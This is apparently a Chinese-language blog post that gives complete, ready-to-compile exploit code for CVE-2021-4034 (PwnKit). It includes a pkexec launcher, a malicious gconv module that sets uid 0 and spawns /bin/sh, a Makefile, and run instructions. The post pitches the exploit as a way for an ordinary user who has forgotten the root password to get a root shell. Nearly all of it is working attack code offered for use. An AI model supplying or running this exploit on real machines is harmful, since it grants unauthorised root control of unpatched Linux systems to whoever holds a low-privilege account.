# CVE-2021-4034 普通用户提权ROOT SHELL漏洞

<!--more-->
只有普通用户，忘记了root密码怎么办? 试试这个方式提权吧!

github: https://github.com/berdav/CVE-2021-4034


### 离线执行,代码如下

cve-2021-4034.c
```bash
#include <unistd.h>

int main(int argc, char **argv)
{
        char * const args[] = {
                NULL
        };
        char * const environ[] = {
                "pwnkit.so:.",
                "PATH=GCONV_PATH=.",
                "SHELL=/lol/i/do/not/exists",
                "CHARSET=PWNKIT",
                "GIO_USE_VFS=",
                NULL
        };
        return execve("/usr/bin/pkexec", args, environ);
}
```

pwnkit.c
```bash
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {
}

void gconv_init(void *step)
{
        char * const args[] = { "/bin/sh", NULL };
        char * const environ[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin", NULL };
        setuid(0);
        setgid(0);
        execve(args[0], args, environ);
        exit(0);
}
```

Makefile
```bash
CFLAGS=-Wall
TRUE=$(shell which true)

.PHONY: all
all: pwnkit.so cve-2021-4034 gconv-modules gconvpath

.PHONY: clean
clean:
        rm -rf pwnkit.so cve-2021-4034 gconv-modules GCONV_PATH=./
        make -C dry-run clean

gconv-modules:
        echo "module UTF-8// PWNKIT// pwnkit 1" > $@

.PHONY: gconvpath
gconvpath:
        mkdir -p GCONV_PATH=.
        cp -f $(TRUE) GCONV_PATH=./pwnkit.so:.

pwnkit.so: pwnkit.c
        $(CC) $(CFLAGS) --shared -fPIC -o $@ $<

.PHONY: dry-run
dry-run:
        make -C dry-run
```

### 执行`make`编译,执行`./cve-2021-4034`提权


---

> 作者: [SoulChild](https://www.soulchild.cn)  
> URL: https://www.soulchild.cn/2844/  

